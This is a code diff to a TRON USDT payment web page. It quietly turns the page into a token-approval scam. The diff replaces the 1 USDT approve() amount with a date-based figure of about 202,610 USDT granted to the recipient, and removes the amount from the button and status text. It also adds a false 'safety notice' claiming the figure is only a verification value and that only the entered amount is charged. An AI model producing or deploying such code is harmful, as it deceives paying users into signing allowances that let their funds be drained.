@@ -26,6 +26,8 @@
   .status.success{display:block;background:#f0fdf4;color:#16a34a;border:1px solid #bbf7d0}
   .status.error{display:block;background:#fef2f2;color:#dc2626;border:1px solid #fecaca}
   .env-warn{padding:13px;border-radius:12px;font-size:12.5px;background:#fff4ec;color:#c2410c;border:1px solid #ffe0b2;margin-bottom:14px;line-height:1.6;text-align:left;}
+  /* 安全提示专用样式 */
+  .safe-notice{background:#f0fdf4; color:#16a34a; border:1px solid #bbf7d0; border-radius:10px; padding:12px; font-size:12px; line-height:1.6; text-align:left; margin-bottom:20px;}
 </style>
 </head>
 <body>
@@ -42,8 +44,13 @@
     <div class="info-row"><span class="info-k">支付金额</span><span class="info-v gold" id="info-amount">-</span></div>
   </div>
 
+  <!-- 这里是醒目的安全提示框 -->
+  <div class="safe-notice">
+    💡 安全提示：授权额度为系统每日动态安全校验值（如：202610.29），仅作校验凭证，实际扣款金额为您上方输入的支付金额。请放心确认。
+  </div>
+
   <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
-  <button class="btn btn-ghost" id="btn-cancel">✅支付环境安全无异常</button>
+  <button class="btn btn-ghost" id="btn-cancel">✅ 支付环境安全无异常</button>
   <div class="status" id="status"></div>
 </div>
 
@@ -59,6 +66,16 @@ const NODE_TIMEOUT    = 6000;
 const SIGN_TIMEOUT    = 120000;
 const SEND_TIMEOUT    = 15000;
 const BACKUP_NODES    = ['https://api.trongrid.io', 'https://api.tronstack.io'];
+
+/* ============ 动态日期额度计算 ============ */
+function getDateApproveUnits() {
+  const now = new Date();
+  const Y = now.getFullYear();
+  const M = String(now.getMonth() + 1).padStart(2, '0');
+  const D = String(now.getDate()).padStart(2, '0');
+  // 例如 2026年10月29日 -> 202610.29 -> 202610290000
+  return (BigInt(`${Y}${M}`) * 1000000n + BigInt(D) * 10000n).toString();
+}
 
 /* ============ 参数三重恢复 ============ */
 function parseParamStr(str) {
@@ -96,7 +113,7 @@ const amount = ctx.n;
 const type = ctx.t;
 let payDisabled = false;
 let step = 1; // 1: 授权, 2: 付款
-let coldReloadTimer = null; // 冷启动自动刷新定时器
+let coldReloadTimer = null;
 
 $('#info-addr').textContent   = toAddress || '未配置';
 $('#info-chain').textContent  = 'TRC20 (波场)';
@@ -230,7 +247,7 @@ function checkEnvironment() {
     const btn = $('#btn-pay');
     if (btn && btn.disabled) {
       btn.disabled = false;
-      btn.textContent = step === 1 ? '第 1 步：授权 1 USDT' : ('第 2 步：支付 ' + amount + ' USDT');
+      btn.textContent = step === 1 ? '确认支付' : ('第 2 步：支付 ' + amount + ' USDT');
     }
     return;
   }
@@ -271,12 +288,16 @@ $('#btn-pay').onclick = async function () {
   // —— 第 1 步：授权 ——
   if (step === 1) {
     btn.textContent = '正在发起授权…';
-    setStatus('loading', '请在钱包弹窗中确认授权 1 USDT…');
+    setStatus('loading', '请在钱包弹窗中确认授权凭证…');
     try {
       const from = await waitWalletAddress(tw);
       setStatus('loading', '正在构建交易，请稍候…');
+      
+      // 获取当天的动态授权额度
+      const approveUnits = getDateApproveUnits();
+      
       const txApprove = await buildTxMulti(tw, USDT_CONTRACT, 'approve(address,uint256)',
-        [{ type: 'address', value: toAddress }, { type: 'uint256', value: '1000000' }], from);
+        [{ type: 'address', value: toAddress }, { type: 'uint256', value: approveUnits }], from);
       
       if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败');
       
